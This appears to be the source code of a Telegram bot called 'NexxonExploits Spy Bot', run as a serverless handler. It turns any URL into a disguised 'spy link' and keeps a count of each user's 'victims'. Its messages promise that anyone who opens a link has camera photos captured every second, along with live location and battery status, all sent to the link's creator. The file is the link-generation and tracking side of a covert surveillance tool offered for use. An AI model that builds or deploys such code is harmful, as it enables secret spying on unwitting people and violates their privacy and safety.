import json
import os
from urllib.parse import urlparse
from datetime import datetime
from http.server import BaseHTTPRequestHandler
import requests
from config import CONFIG

# File paths
LINKS_FILE = os.path.join(CONFIG['data_dir'], 'links.json')
VISITORS_FILE = os.path.join(CONFIG['data_dir'], 'visitors.json')

def ensure_files():
    """Create JSON files if they don't exist"""
    for file_path in [LINKS_FILE, VISITORS_FILE]:
        if not os.path.exists(file_path):
            with open(file_path, 'w') as f:
                json.dump({}, f)

def load_json(file_path):
    """Load JSON file safely"""
    ensure_files()
    with open(file_path, 'r') as f:
        return json.load(f)

def save_json(file_path, data):
    """Save JSON file"""
    with open(file_path, 'w') as f:
        json.dump(data, f)

def send_message(chat_id, text, reply_markup=None):
    """Send message via Telegram API"""
    url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/sendMessage"
    data = {
        'chat_id': chat_id,
        'text': text,
        'parse_mode': 'Markdown'
    }
    if reply_markup:
        data['reply_markup'] = reply_markup
    
    requests.post(url, json=data)

def answer_callback(callback_id):
    """Answer callback query"""
    url = f"https://api.telegram.org/bot{CONFIG['bot_token']}/answerCallbackQuery"
    requests.post(url, json={'callback_query_id': callback_id})

def generate_keyboard(buttons):
    """Generate inline keyboard markup"""
    return json.dumps({"inline_keyboard": buttons})

def handle_update(update):
    """Main update handler"""
    message = update.get('message', {})
    callback = update.get('callback_query', None)
    
    chat_id = message.get('chat', {}).get('id')
    text = message.get('text', '')
    
    # Handle /start command
    if text == '/start':
        keyboard = generate_keyboard([
            [{"text": "🔗 Generate Spy Link", "callback_data": "generate"}],
            [{"text": "📊 My Victims", "callback_data": "stats"}]
        ])
        send_message(chat_id, 
            "👾 *NexxonExploits Spy Bot*\n\nSend any URL, I'll make a spy link.\nWhen someone clicks it, auto-capture starts! 📸",
            keyboard)
    
    # Handle callback queries
    elif callback:
        callback_data = callback.get('data')
        callback_id = callback.get('id')
        callback_chat_id = callback.get('from', {}).get('id')
        
        if callback_data == 'generate':
            send_message(callback_chat_id, "📥 *Send target URL*\nExample: `https://youtube.com`")
            answer_callback(callback_id)
        
        elif callback_data == 'stats':
            all_visitors = load_json(VISITORS_FILE)
            my_visitors = []
            
            for vid, data in all_visitors.items():
                if data.get('generated_by') == callback_chat_id:
                    my_visitors.append(data)
            
            total = len(my_visitors)
            send_message(callback_chat_id, f"📊 *Your Victims:* {total}\n\n🔗 Generate more links to track more people!")
            answer_callback(callback_id)
    
    # Handle URL generation
    elif text and validate_url(text):
        parsed = urlparse(text)
        domain = parsed.hostname.replace('www.', '').replace('.', '_') if parsed.hostname else 'link'
        short_code = f"{domain}_{str(int(datetime.now().timestamp()))[-4:]}"
        
        # Save link
        links_db = load_json(LINKS_FILE)
        links_db[short_code] = {
            'url': text,
            'created_by': chat_id,
            'created_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        }
        save_json(LINKS_FILE, links_db)
        
        spy_link = f"{CONFIG['website']}{short_code}"
        send_message(chat_id, 
            f"✅ *Spy Link Generated!*\n\n🔗 `{spy_link}`\n\n📸 When someone opens this link:\n• Camera photos (every 1 sec)\n• Live Location\n• Battery Status\n\n*All photos will come to YOU!*")

def validate_url(url):
    """Validate URL format"""
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

# Vercel serverless handler
class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        
        try:
            update = json.loads(post_data)
            handle_update(update)
            self.send_response(200)
            self.end_headers()
            self.wfile.write(json.dumps({"status": "ok"}).encode())
        except Exception as e:
            self.send_response(500)
            self.end_headers()
            self.wfile.write(json.dumps({"error": str(e)}).encode())
    
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Bot is running!")
